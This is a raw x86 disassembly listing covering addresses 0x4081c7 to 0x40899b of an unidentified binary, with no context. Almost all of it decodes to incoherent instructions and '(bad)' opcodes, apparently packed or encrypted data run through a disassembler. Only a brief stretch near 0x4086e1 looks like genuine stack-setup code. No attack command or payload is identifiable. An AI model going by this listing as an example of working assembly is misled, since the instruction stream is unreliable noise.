  4081c7:	rcr    BYTE PTR [edx+0x5],1
  4081ca:	lds    ebp,FWORD PTR [ebp+0x2f]
  4081cd:	sbb    eax,0xaf3ad5eb
  4081d2:	cmp    BYTE PTR ss:[ebx],bh
  4081d5:	pop    eax
  4081d6:	sar    BYTE PTR [edx-0x5d],cl
  4081d9:	xor    ah,cl
  4081db:	cmp    eax,0xa48b2801
  4081e0:	pusha  
  4081e1:	shl    DWORD PTR [edx+eax*2],0xf7
  4081e5:	mov    al,ds:0xe40d97f5
  4081ea:	pop    ss
  4081eb:	push   ecx
  4081ec:	xchg   ah,ah
  4081ee:	sub    edi,esi
  4081f0:	or     ecx,ecx
  4081f2:	sbb    al,0x14
  4081f4:	xor    DWORD PTR [edi+0x5b],ebx
  4081f7:	xor    al,0x97
  4081f9:	adc    al,0xcc
  4081fb:	inc    ebx
  4081fc:	mov    ebx,0xee2a56d5
  408201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408202:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408203:	into   
  408204:	pushf  
  408205:	and    DWORD PTR [ebx],0xffffffbc
  408208:	xor    al,0x1f
  40820a:	sahf   
  40820b:	dec    edi
  40820c:	xor    ebp,DWORD PTR [edi+ebx*2+0x702cdb76]
  408213:	rcl    BYTE PTR ds:0xf0af9119,1
  408219:	mov    al,ds:0xa1e4d5ff
  40821e:	sub    BYTE PTR [ebp+0x5cf84d43],bl
  408224:	jg     0x408244
  408226:	rcl    DWORD PTR [edi-0x3666e28d],1
  40822c:	jmp    0x4081cd
  40822e:	xlat   BYTE PTR ds:[ebx]
  40822f:	adc    eax,0xd9ee665
  408234:	aad    0xc9
  408236:	and    BYTE PTR [edi-0x83b87c2],ah
  40823c:	jbe    0x408270
  40823e:	inc    esi
  40823f:	div    DWORD PTR [edx]
  408241:	in     al,dx
  408242:	(bad)
  408245:	outs   dx,DWORD PTR ds:[esi]
  408246:	fstp   DWORD PTR [edi+edi*8+0x7627a84b]
  40824d:	add    ebx,ecx
  40824f:	iret   
  408250:	push   eax
  408251:	inc    ebp
  408252:	rol    BYTE PTR [ecx],0xe2
  408255:	and    ebp,DWORD PTR [edi]
  408257:	in     eax,0x6
  408259:	mov    DWORD PTR [edx+0x57],ebp
  40825c:	imul   ebx,DWORD PTR [edx+0x39514c2d],0x36
  408263:	outs   dx,DWORD PTR ds:[esi]
  408264:	retf   
  408265:	enter  0x6f83,0xab
  408269:	cmp    BYTE PTR [ebx],0xd
  40826c:	std    
  40826d:	dec    edx
  40826e:	fdiv   st(6),st
  408270:	retf   0x4fdc
  408273:	sub    eax,0xa58613e2
  408278:	sub    esp,eax
  40827a:	xchg   edx,eax
  40827b:	shl    DWORD PTR [ebx],1
  40827d:	retf   
  40827e:	ins    DWORD PTR es:[edi],dx
  40827f:	push   cs
  408280:	mov    edx,0xcd4c4da9
  408285:	shl    BYTE PTR [esi+0x110a1c10],cl
  40828b:	sub    bl,dh
  40828d:	and    BYTE PTR [esi-0x7366b0ec],ah
  408293:	jmp    0x5c3c:0x2b5cb2f
  40829a:	mov    ds:0x166ccf40,al
  40829f:	daa    
  4082a0:	inc    edi
  4082a1:	dec    ebx
  4082a2:	ret    0xc9d6
  4082a5:	adc    eax,0x308f0399
  4082aa:	sbb    dl,bl
  4082ac:	pop    esi
  4082ad:	sub    DWORD PTR [ebx],edi
  4082af:	xchg   esp,eax
  4082b0:	inc    ebp
  4082b1:	sub    DWORD PTR [ebx-0x595e3758],edi
  4082b7:	stos   BYTE PTR es:[edi],al
  4082b8:	(bad)  
  4082b9:	sub    BYTE PTR [edi+0x70aca13a],bh
  4082bf:	test   BYTE PTR ds:0xe19b4afe,cl
  4082c5:	pop    es
  4082c6:	fsub   QWORD PTR [eax]
  4082c8:	int3   
  4082c9:	aaa    
  4082ca:	jg     0x4082c4
  4082cc:	adc    eax,0xa4d2b9c6
  4082d1:	mov    eax,0x9814fec2
  4082d6:	sub    eax,0x102edce3
  4082db:	fs add bl,ch
  4082de:	add    ebp,DWORD PTR [eax-0x1]
  4082e1:	push   esp
  4082e2:	cmp    DWORD PTR [edi-0x10fd0363],ebp
  4082e8:	ret    
  4082e9:	mov    ah,0xe3
  4082eb:	mov    bl,0x7f
  4082ed:	push   edx
  4082ee:	mov    eax,ds:0xdd3b452
  4082f3:	dec    ebp
  4082f4:	js     0x408276
  4082f6:	mov    ah,0x7f
  4082f8:	(bad)  [ebx+0x1a9691f0]
  4082fe:	loop   0x408353
  408300:	push   cs
  408301:	pop    ecx
  408302:	sub    eax,0x3b3bb8ad
  408307:	clc    
  408308:	(bad)  
  408309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40830a:	xchg   ebp,eax
  40830b:	sub    eax,DWORD PTR [eax+0x1cff5baf]
  408311:	and    eax,0x79943fb7
  408316:	ins    BYTE PTR es:[edi],dx
  408317:	xlat   BYTE PTR ds:[ebx]
  408318:	les    eax,FWORD PTR [edx+0x70]
  40831b:	bnd jo 0x4082a3
  40831e:	xchg   edi,eax
  40831f:	push   ss
  408320:	lea    eax,[edx+0x4d55f65d]
  408326:	dec    eax
  408327:	lods   al,BYTE PTR ds:[esi]
  408328:	jnp    0x408392
  40832a:	mov    al,0x7
  40832c:	or     eax,0x20627948
  408331:	add    al,0x6a
  408333:	js     0x4083a9
  408335:	or     DWORD PTR ds:0x3373ae46,edx
  40833b:	sub    al,0x1b
  40833d:	or     esp,DWORD PTR [esp+ebp*2]
  408340:	dec    ebx
  408341:	adc    ebx,DWORD PTR ds:0x3f4c5812
  408347:	jns    0x408347
  408349:	pop    edi
  40834a:	scas   al,BYTE PTR es:[edi]
  40834b:	ja     0x40835e
  40834d:	cli    
  40834e:	int3   
  40834f:	sbb    DWORD PTR [edi+0x15],edx
  408352:	ja     0x4083b5
  408354:	and    eax,0x919aee33
  408359:	push   esp
  40835a:	mov    al,ds:0xb73da41c
  40835f:	div    DWORD PTR [ebx-0xa55c07b]
  408365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408366:	push   0x333b7bb
  40836b:	xor    al,0xfb
  40836d:	hlt    
  40836e:	imul   DWORD PTR [esi-0x58]
  408371:	loopne 0x4083ad
  408373:	out    dx,eax
  408374:	repz dec ebx
  408376:	fsubrp st(1),st
  408378:	ins    DWORD PTR es:[edi],dx
  408379:	inc    esp
  40837a:	mov    edx,0x8341835
  40837f:	inc    ebp
  408380:	outs   dx,BYTE PTR ds:[esi]
  408381:	mov    ebx,DWORD PTR [edi+0x11234e42]
  408387:	mov    ebp,ebp
  408389:	mov    dl,0xb3
  40838b:	pushf  
  40838c:	jle    0x40835d
  40838e:	and    eax,DWORD PTR [ebx]
  408390:	xlat   BYTE PTR ds:[ebx]
  408391:	or     ch,cl
  408393:	fidiv  DWORD PTR [eax+eiz*8-0x1e]
  408397:	sub    eax,0x12d247d2
  40839c:	fistp  DWORD PTR [eax]
  40839e:	stos   DWORD PTR es:[edi],eax
  40839f:	call   0xa31d:0x3776f3d8
  4083a6:	mov    ds:0x25a19d2,al
  4083ab:	pop    eax
  4083ac:	jb     0x408396
  4083ae:	jbe    0x408380
  4083b0:	sbb    DWORD PTR [ecx-0x14],0xc3194140
  4083b7:	cmp    dh,dl
  4083b9:	push   ss
  4083ba:	inc    ebp
  4083bb:	mov    esi,0x7271f95b
  4083c0:	xchg   BYTE PTR [ebx-0x3e3fa54b],al
  4083c6:	imul   edx,DWORD PTR [edi],0x3fb34506
  4083cc:	sahf   
  4083cd:	push   esp
  4083ce:	mov    bh,0x3c
  4083d0:	inc    edi
  4083d1:	inc    esp
  4083d2:	popf   
  4083d3:	push   ds
  4083d4:	fwait
  4083d5:	es (bad) 
  4083d7:	sbb    al,0x7a
  4083d9:	(bad)  
  4083da:	push   ecx
  4083db:	call   0xa803:0x833cef3e
  4083e2:	(bad)  
  4083e3:	or     al,0xbd
  4083e5:	cmp    BYTE PTR [eax],ah
  4083e7:	popa   
  4083e8:	lea    ebx,[ebx+0x3a]
  4083eb:	mov    ecx,0xa02b560d
  4083f0:	in     eax,dx
  4083f1:	ret    0x95b8
  4083f4:	(bad)  
  4083f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083f6:	jo     0x40838c
  4083f8:	or     ah,BYTE PTR [ebp-0x49ac21ec]
  4083fe:	xchg   ebx,eax
  4083ff:	es cmc 
  408401:	loop   0x4083b1
  408403:	push   ds
  408404:	sub    ecx,DWORD PTR [eax+0x5c2c40a9]
  40840a:	push   esp
  40840b:	pop    es
  40840c:	rcr    DWORD PTR [ebx+0x7473b155],1
  408412:	test   BYTE PTR [ebp+0x12627398],dl
  408418:	in     eax,dx
  408419:	xchg   esi,eax
  40841a:	jecxz  0x40840f
  40841c:	cwde   
  40841d:	xchg   BYTE PTR [edi-0x3a01d615],al
  408423:	pop    edi
  408424:	sbb    edi,ecx
  408426:	das    
  408427:	fcomi  st,st(2)
  408429:	adc    ah,ch
  40842b:	dec    esp
  40842c:	psubb  mm7,QWORD PTR [eax]
  40842f:	cs in  ax,dx
  408432:	xchg   ecx,eax
  408433:	popa   
  408434:	hlt    
  408435:	sbb    BYTE PTR [esi+0x3d],cl
  408438:	add    al,0xe7
  40843a:	dec    eax
  40843b:	out    dx,eax
  40843c:	jnp    0x408488
  40843e:	mov    ebp,0x8bd36113
  408443:	or     esp,DWORD PTR [esi+ebx*2-0x6556e45b]
  40844a:	inc    ebx
  40844b:	cld    
  40844c:	adc    BYTE PTR [eax+0x9],0x40
  408450:	mov    ah,BYTE PTR [ecx-0x9]
  408453:	lss    ebp,FWORD PTR [eax]
  408456:	cwde   
  408457:	jb     0x408425
  408459:	cwde   
  40845a:	inc    eax
  40845b:	mov    al,ds:0x10f996b0
  408460:	(bad)
  408463:	pop    es
  408464:	cld    
  408465:	push   0x57
  408467:	mov    eax,ds:0x558c16d1
  40846c:	or     DWORD PTR [edx-0x52],ecx
  40846f:	pushf  
  408470:	push   ds
  408471:	test   esp,edx
  408473:	fs mov bl,0xe9
  408476:	dec    edx
  408477:	rol    DWORD PTR [edx+eiz*4],1
  40847a:	loopne 0x4084ef
  40847c:	sbb    BYTE PTR [ebp+esi*8-0x4],al
  408480:	cmp    BYTE PTR [ebp+0x59602111],0x4c
  408487:	scas   al,BYTE PTR es:[edi]
  408488:	mov    ds:0x9745f10b,al
  40848d:	call   0x157417a1
  408492:	jp     0x4084e1
  408494:	mov    bh,0x93
  408496:	daa    
  408497:	cs mov bh,0x92
  40849a:	les    esp,FWORD PTR [ecx-0x10]
  40849d:	xchg   ebx,eax
  40849e:	fucomp st(1)
  4084a0:	pop    esp
  4084a1:	call   0x1481:0xcc4149aa
  4084a8:	cmp    DWORD PTR [edi+0x1b528185],ebx
  4084ae:	add    eax,esp
  4084b0:	cmp    DWORD PTR ds:0x25cfb2a,ebx
  4084b6:	addr16 inc ecx
  4084b8:	inc    edx
  4084b9:	or     DWORD PTR [ecx-0x2c],ebx
  4084bc:	cmp    al,0xe
  4084be:	inc    esp
  4084bf:	test   BYTE PTR [eax],dl
  4084c1:	sar    ebp,cl
  4084c3:	jns    0x4084d6
  4084c5:	xchg   DWORD PTR [ecx-0x7],esp
  4084c8:	jo     0x40846e
  4084ca:	mov    ebx,0xb308b10b
  4084cf:	call   0xc35c:0xa9154f50
  4084d6:	mov    ds,WORD PTR [ecx+0x4994b6a0]
  4084dc:	mov    ds:0xabac728c,eax
  4084e1:	cdq    
  4084e2:	popa   
  4084e3:	pusha  
  4084e4:	shl    BYTE PTR [esi+0x77],cl
  4084e7:	pushf  
  4084e8:	aaa    
  4084e9:	call   0x2b62061e
  4084ee:	mov    al,0xcc
  4084f0:	dec    ecx
  4084f1:	cld    
  4084f2:	rcl    BYTE PTR [ebp+edx*2+0x1f],cl
  4084f6:	pop    esp
  4084f7:	shl    BYTE PTR [esi-0xcb90fdc],0xd4
  4084fe:	jg     0x4084f9
  408500:	mov    eax,ds:0xad630494
  408505:	mov    ecx,0xe01c11bc
  40850a:	or     DWORD PTR [esi+0x5bb9e511],edx
  408510:	(bad)  
  408512:	sbb    ch,ah
  408514:	shl    DWORD PTR [eax+0x2563988a],0x84
  40851b:	pop    eax
  40851c:	push   edi
  40851d:	xchg   esp,ebp
  40851f:	cmc    
  408520:	add    DWORD PTR [edx-0x7ccb6db9],eax
  408526:	repz push ds
  408528:	xchg   edi,eax
  408529:	lods   al,BYTE PTR ds:[esi]
  40852a:	lahf   
  40852b:	xor    BYTE PTR [edi-0x78],bh
  40852e:	neg    BYTE PTR [ecx]
  408530:	scas   eax,DWORD PTR es:[edi]
  408531:	aas    
  408532:	sub    eax,0x8df9481a
  408537:	mov    eax,ds:0x17a6f1c8
  40853c:	out    0x2b,eax
  40853e:	in     eax,dx
  40853f:	dec    esp
  408540:	mov    bh,0x2a
  408542:	cld    
  408543:	xor    al,0xd3
  408545:	loope  0x408531
  408547:	xchg   DWORD PTR [esi-0x7fbbae78],ecx
  40854d:	xor    BYTE PTR [edi],al
  40854f:	jns    0x40859e
  408551:	lock mov WORD PTR [esi],fs
  408554:	mov    al,ds:0x4ac673a5
  408559:	leave  
  40855a:	mov    al,ds:0x6e189a4d
  40855f:	ficom  DWORD PTR [eax+0x3a62a9e1]
  408565:	lock in al,0xce
  408568:	dec    edx
  408569:	sub    DWORD PTR [ebp+edi*2-0x7],edx
  40856d:	test   BYTE PTR [edi],al
  40856f:	cdq    
  408570:	stos   BYTE PTR es:[edi],al
  408571:	arpl   WORD PTR [esi+0x31],cx
  408574:	jmp    0x7dc2:0xc4c2eaf3
  40857b:	imul   esi,DWORD PTR [ecx+0xb23d0c5],0x869abd11
  408585:	aad    0x87
  408587:	adc    edi,DWORD PTR [ecx-0x55]
  40858a:	fs retf 0x53ed
  40858e:	jno    0x408516
  408590:	push   ebx
  408591:	in     al,0x2e
  408593:	shl    DWORD PTR [eax-0x3c],1
  408596:	dec    esp
  408597:	inc    ecx
  408598:	xor    BYTE PTR ds:0x63ed2523,bh
  40859e:	adc    esp,DWORD PTR [ebx+ebx*2+0x66]
  4085a2:	addr16 pop esi
  4085a4:	add    BYTE PTR [ebx-0x43],ah
  4085a7:	and    edi,DWORD PTR [ebp-0x5c92bd10]
  4085ad:	outs   dx,DWORD PTR ds:[esi]
  4085ae:	daa    
  4085af:	icebp  
  4085b0:	xchg   edx,eax
  4085b1:	jmp    0x3d19:0xc52aaab7
  4085b8:	shl    DWORD PTR [eax-0x26],1
  4085bb:	(bad)  
  4085bc:	push   ebx
  4085bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085be:	cmp    dl,al
  4085c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c1:	pushf  
  4085c2:	test   eax,0xff794d08
  4085c7:	fs sti 
  4085c9:	jle    0x40857b
  4085cb:	sahf   
  4085cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085cd:	cwde   
  4085ce:	dec    esi
  4085cf:	rol    BYTE PTR [edi-0x2f0d8150],1
  4085d5:	jo     0x4085bf
  4085d7:	xor    DWORD PTR [ebp+0x14],esp
  4085da:	mov    esi,0x8e80fce9
  4085df:	(bad)  
  4085e0:	fild   DWORD PTR [ecx]
  4085e2:	aad    0x25
  4085e4:	mov    bl,BYTE PTR [esi+0x4f]
  4085e7:	push   esi
  4085e8:	sbb    esp,ebp
  4085ea:	sub    ebx,esp
  4085ec:	cmp    ch,BYTE PTR [ecx]
  4085ee:	dec    esi
  4085ef:	imul   edx,DWORD PTR [ebp-0x5b],0xffffff86
  4085f3:	icebp  
  4085f4:	mov    ch,0x46
  4085f6:	popf   
  4085f7:	(bad)  
  4085f8:	or     eax,0xb55e016a
  4085fd:	stos   BYTE PTR es:[edi],al
  4085fe:	jmp    0x40858a
  408600:	lds    edx,FWORD PTR [esi]
  408602:	jne    0x4085f7
  408604:	xor    DWORD PTR [edx+0x43],ebx
  408607:	jnp    0x4085f9
  408609:	ja     0x4085b8
  40860b:	pop    es
  40860c:	cmp    eax,0xeaca3d9f
  408611:	pop    fs
  408613:	pop    esi
  408614:	dec    ecx
  408615:	mov    es,WORD PTR [esi+0x54a24181]
  40861b:	mov    cl,0x80
  40861d:	dec    DWORD PTR cs:[ebx-0x4d0ab72b]
  408624:	fnstenv [esi+0x72]
  408627:	in     al,dx
  408628:	stc    
  408629:	scas   eax,DWORD PTR es:[edi]
  40862a:	arpl   WORD PTR [esi],cx
  40862c:	fsubr  QWORD PTR [edi+0x53f6b768]
  408632:	push   eax
  408633:	bound  ecx,QWORD PTR [ebp-0xd6546ff]
  408639:	pusha  
  40863a:	and    ecx,DWORD PTR [ecx-0x19]
  40863d:	mov    edx,0xeebefdf
  408642:	cwde   
  408643:	jecxz  0x408615
  408645:	gs cmp eax,0xa22dd567
  40864b:	ror    BYTE PTR [ebx+0x3d556a9f],cl
  408651:	sti    
  408652:	lahf   
  408653:	pop    ebp
  408654:	aaa    
  408655:	or     DWORD PTR gs:[edi+0x22],ecx
  408659:	add    al,0xf6
  40865b:	jnp    0x4086a5
  40865d:	mov    eax,0x239d79ca
  408662:	xchg   BYTE PTR [ebx-0x4c],dl
  408665:	imul   esi,DWORD PTR [esi+0xf],0xffffffb2
  408669:	push   0x5e
  40866b:	mov    cl,0x49
  40866d:	lock aaa 
  40866f:	fdiv   DWORD PTR [ecx-0x705c7efd]
  408675:	push   0xb4b9fc45
  40867a:	xchg   BYTE PTR [edx+0x68639d16],ch
  408680:	mov    al,0xf
  408682:	mov    ch,0xe9
  408684:	das    
  408685:	inc    esi
  408686:	pop    esp
  408687:	test   eax,0x4344a100
  40868c:	lock push ebx
  40868e:	stos   DWORD PTR es:[edi],eax
  40868f:	ret    0x2e67
  408692:	cdq    
  408693:	bnd ja 0x4086e6
  408696:	pop    ss
  408697:	les    esi,FWORD PTR [edi]
  408699:	adc    DWORD PTR [ecx],0xffffffdd
  40869c:	mov    bh,0x45
  40869e:	pusha  
  40869f:	lock test al,0x26
  4086a2:	xor    bl,BYTE PTR [edi]
  4086a4:	call   DWORD PTR [edi+0x66]
  4086a7:	sbb    al,0xb7
  4086a9:	add    al,0x50
  4086ab:	mov    al,0xbc
  4086ad:	adc    DWORD PTR [esi+0x2b],ecx
  4086b0:	das    
  4086b1:	sub    DWORD PTR [esi],edi
  4086b3:	test   DWORD PTR [edi-0xb4ad6be],eax
  4086b9:	test   eax,0xaf840593
  4086be:	add    al,0x7c
  4086c0:	ror    BYTE PTR [ebp-0x28],cl
  4086c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086c4:	mov    edi,DWORD PTR [eax+ecx*8]
  4086c7:	mov    al,ds:0x74b4d01d
  4086cc:	nop
  4086cd:	add    eax,0xd9492ba7
  4086d2:	fcmovnb st,st(5)
  4086d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086d5:	je     0x40865f
  4086d7:	je     0x408743
  4086d9:	add    esi,DWORD PTR [ebx]
  4086db:	rcr    BYTE PTR [edx-0x7d],cl
  4086de:	ret    0x5208
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0x969fcee6
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  eax,QWORD PTR [ecx+0x416456a9]
  408723:	pop    edi
  408724:	xchg   esi,eax
  408725:	scas   eax,DWORD PTR es:[edi]
  408726:	scas   al,BYTE PTR es:[edi]
  408727:	jmp    0x281971fd
  40872c:	dec    edx
  40872d:	pop    esi
  40872e:	repnz test BYTE PTR [esi+0x55],0xa1
  408733:	ds push ss
  408735:	xchg   edx,eax
  408736:	mov    al,ds:0xff19a4b1
  40873b:	out    dx,al
  40873c:	mov    WORD PTR [eax],ss
  40873e:	fcmovnbe st,st(1)
  408740:	pop    ebp
  408741:	pusha  
  408742:	mov    eax,ds:0x7ffa15e9
  408747:	loop   0x40870b
  408749:	leave  
  40874a:	sub    DWORD PTR [esi-0x6801223b],ebp
  408750:	xor    DWORD PTR [edi-0x40],ebx
  408753:	sub    BYTE PTR [ebx-0x9],dh
  408756:	arpl   WORD PTR [ecx],si
  408758:	idiv   DWORD PTR [edi+0x77]
  40875b:	call   0x684a929f
  408760:	lods   al,BYTE PTR ds:[esi]
  408761:	pop    ebx
  408762:	cmp    ecx,DWORD PTR [ecx]
  408764:	sub    al,0x4b
  408766:	xchg   ecx,eax
  408767:	pushf  
  408768:	jp     0x4087a5
  40876a:	in     eax,0x85
  40876c:	mov    dl,0xbd
  40876e:	or     dl,BYTE PTR [ebp-0x13147f36]
  408774:	cmp    edi,DWORD PTR [ebx]
  408776:	inc    DWORD PTR [esi]
  408778:	das    
  408779:	sbb    ebx,DWORD PTR [eax+0x6b]
  40877c:	test   eax,0x3c89a6fa
  408781:	jge    0x40870d
  408783:	push   edi
  408784:	in     al,dx
  408785:	xchg   DWORD PTR [eax],ecx
  408787:	sbb    ch,BYTE PTR [eax+0x25b2a535]
  40878d:	mov    cl,0x38
  40878f:	shl    ebp,0xe5
  408792:	es popf 
  408794:	sbb    BYTE PTR [eax-0x34cc496b],ch
  40879a:	inc    ebx
  40879b:	fmul   st(0),st
  40879d:	mov    ch,0x30
  40879f:	or     al,0x2f
  4087a1:	add    DWORD PTR [eax+ebx*1+0x3acaae70],0xffffffaa
  4087a9:	out    0xa4,al
  4087ab:	add    BYTE PTR [edi+0x7c],al
  4087ae:	jo     0x408823
  4087b0:	imul   edx,eax,0x3e0593d3
  4087b6:	adc    ah,BYTE PTR [esi-0x2e]
  4087b9:	(bad)  
  4087ba:	in     al,dx
  4087bb:	inc    edx
  4087bc:	(bad)  
  4087be:	(bad)  
  4087bf:	pslld  mm4,mm7
  4087c2:	test   BYTE PTR ds:0x49ee99e7,bl
  4087c8:	popa   
  4087c9:	sbb    ch,BYTE PTR [eax]
  4087cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087cc:	(bad)  
  4087cd:	pop    es
  4087ce:	mov    ebp,0x98c8da42
  4087d3:	xchg   ecx,eax
  4087d4:	into   
  4087d5:	rol    DWORD PTR [edi+esi*2],1
  4087d8:	je     0x408796
  4087da:	test   DWORD PTR [edx],ebx
  4087dc:	repz xor eax,0xcdb51f3c
  4087e2:	inc    ebx
  4087e3:	jmp    0x4087c6
  4087e5:	repnz mov cl,0x63
  4087e8:	jno    0x408775
  4087ea:	(bad)  
  4087ec:	aaa    
  4087ed:	mov    ds:0x32a01b88,al
  4087f2:	retf   0xa51d
  4087f5:	adc    ebp,DWORD PTR [esp+eax*8-0x19]
  4087f9:	mul    al
  4087fb:	cs sahf 
  4087fd:	pushf  
  4087fe:	or     ecx,DWORD PTR [esp+esi*1-0x591cb9b7]
  408805:	dec    edx
  408806:	jmp    FWORD PTR [ecx]
  408808:	xchg   BYTE PTR [eax-0x6474920e],dh
  40880e:	(bad)  
  40880f:	or     BYTE PTR [ebp+ebx*8+0x74],bl
  408813:	or     ah,BYTE PTR [edx+eax*2]
  408816:	test   ch,dl
  408818:	test   eax,0x19df51a9
  40881d:	xchg   BYTE PTR [ecx-0x47],dl
  408820:	js     0x40880b
  408822:	fcmovu st,st(1)
  408824:	xchg   DWORD PTR [edi],edi
  408826:	lods   eax,DWORD PTR ds:[esi]
  408827:	sar    ecx,1
  408829:	ss jns 0x408845
  40882c:	pop    edx
  40882d:	pop    ebx
  40882e:	fisubr DWORD PTR [edx+edi*2]
  408831:	shl    DWORD PTR gs:[esi+0x5f3f3aa9],cl
  408838:	into   
  408839:	xchg   esp,eax
  40883a:	adc    DWORD PTR [eax+0x4e],ecx
  40883d:	push   eax
  40883e:	sbb    al,0xd4
  408840:	jmp    0xa197a5e2
  408845:	xor    eax,0xd888449c
  40884a:	or     al,0xbf
  40884c:	add    eax,0x2d2cc76e
  408851:	jne    0x40880a
  408853:	and    BYTE PTR ds:0xb24ecf65,cl
  408859:	push   ss
  40885a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40885b:	nop
  40885c:	fwait
  40885d:	sar    DWORD PTR [ebx],1
  40885f:	inc    edx
  408860:	fdivr  st,st(4)
  408862:	xchg   edi,eax
  408863:	sub    BYTE PTR [esi-0x4],dh
  408866:	dec    edi
  408867:	jne    0x4088d6
  408869:	lods   eax,DWORD PTR ds:[esi]
  40886a:	inc    esp
  40886b:	xchg   BYTE PTR [edi-0x1b7c7158],dl
  408871:	js     0x4088de
  408873:	cmp    dl,BYTE PTR [ecx+ebx*2+0x66ba81d6]
  40887a:	adc    al,0x69
  40887c:	xor    BYTE PTR [ebx+0x42],cl
  40887f:	dec    ecx
  408880:	inc    esi
  408881:	and    DWORD PTR [edx-0x65],ebp
  408884:	or     esi,ebp
  408886:	adc    esp,DWORD PTR [edi]
  408888:	and    BYTE PTR [ebp+0x41777429],al
  40888e:	push   edi
  40888f:	xor    DWORD PTR [ebx-0xe],eax
  408892:	pop    eax
  408893:	es jmp 0xa083ba67
  408899:	int    0x40
  40889b:	in     al,0xab
  40889d:	xor    DWORD PTR [eax],ebx
  40889f:	mov    bh,0x1
  4088a1:	nop
  4088a2:	aad    0xd5
  4088a4:	or     dl,BYTE PTR [eax+edi*2+0x6ffe5b43]
  4088ab:	jnp    0x408863
  4088ad:	jmp    0xbd2e:0x204577ac
  4088b4:	jecxz  0x408886
  4088b6:	out    dx,eax
  4088b7:	mov    cl,0xbf
  4088b9:	xchg   DWORD PTR [esi+ebp*2+0x2],ebp
  4088bd:	cmc    
  4088be:	push   cs
  4088bf:	adc    eax,0xc3c0b23a
  4088c4:	(bad)  
  4088c5:	and    DWORD PTR [eax-0x1d815ada],eax
  4088cb:	popa   
  4088cc:	ret    0xf7b1
  4088cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088d0:	(bad)  
  4088d1:	xlat   BYTE PTR ds:[ebx]
  4088d2:	pop    eax
  4088d3:	push   esi
  4088d4:	fprem1 
  4088d6:	or     al,0xfb
  4088d8:	cdq    
  4088d9:	scas   al,BYTE PTR es:[edi]
  4088da:	es xchg esi,eax
  4088dc:	xor    al,0xbc
  4088de:	mov    WORD PTR [ebp-0x3a],gs
  4088e1:	push   ss
  4088e2:	sbb    DWORD PTR [esi-0x15],edi
  4088e5:	loop   0x408904
  4088e7:	cmp    eax,0x2cc5d86f
  4088ec:	shr    DWORD PTR [ecx-0xf],1
  4088ef:	add    ch,BYTE PTR [eax+0x19bb826f]
  4088f5:	outs   dx,DWORD PTR ds:[esi]
  4088f6:	jnp    0x408880
  4088f8:	imul   ecx,DWORD PTR [eax-0x414243a5],0x2e
  4088ff:	jb     0x40888e
  408901:	cmp    edi,DWORD PTR [ebp+eiz*4+0x5f93820b]
  408908:	jg     0x4088c4
  40890a:	lahf   
  40890b:	pop    es
  40890c:	pusha  
  40890d:	jns    0x40896b
  40890f:	adc    bl,BYTE PTR [ebx+ebp*8-0x77]
  408913:	push   0xffffffd5
  408915:	jae    0x408901
  408917:	les    esi,FWORD PTR [ecx+0x78f615be]
  40891d:	pop    ebp
  40891e:	enter  0xc94f,0x17
  408922:	ja     0x408951
  408924:	mov    dl,0xfb
  408926:	icebp  
  408927:	jle    0x4088bb
  408929:	jmp    0xa0c57fb8
  40892e:	rcr    edx,0x23
  408931:	mov    ebp,0xd6474189
  408936:	test   BYTE PTR [ebx],ah
  408938:	push   esi
  408939:	cld    
  40893a:	imul   esi,esp,0x18643581
  408940:	dec    edx
  408941:	mov    ds,edx
  408943:	adc    ah,BYTE PTR [ebp+0x9]
  408946:	(bad)  
  408947:	lods   al,BYTE PTR ds:[esi]
  408948:	pop    es
  408949:	fwait
  40894a:	mov    ch,0x56
  40894c:	xchg   BYTE PTR ds:0x499a0db,al
  408952:	popa   
  408953:	push   0x8ef614e7
  408958:	out    dx,al
  408959:	je     0x4089a9
  40895b:	xlat   BYTE PTR ds:[ebx]
  40895c:	adc    BYTE PTR [edx+0x7022b42b],cl
  408962:	out    dx,eax
  408963:	sub    BYTE PTR [edx+eiz*2],bh
  408966:	mov    edx,0x26f07fe4
  40896b:	mov    ebx,0x60bfe3f9
  408970:	sbb    ch,ah
  408972:	enter  0x4ee9,0xba
  408976:	sahf   
  408977:	fxch   st(0)
  408979:	popf   
  40897a:	lods   eax,DWORD PTR ds:[esi]
  40897b:	mov    ecx,0x8284edb
  408980:	and    al,0x10
  408982:	je     0x408916
  408984:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408986:	fs test al,0xd2
  408989:	fs int 0x7e
  40898c:	xchg   edx,eax
  40898d:	into   
  40898e:	and    esp,DWORD PTR [esi-0x2d985e8]
  408994:	pop    eax
  408995:	test   al,0xee
  408997:	out    dx,al
  408998:	fstp   DWORD PTR [ebx]
  40899a:	pop    esi
  40899b:	sbb    eax,edx
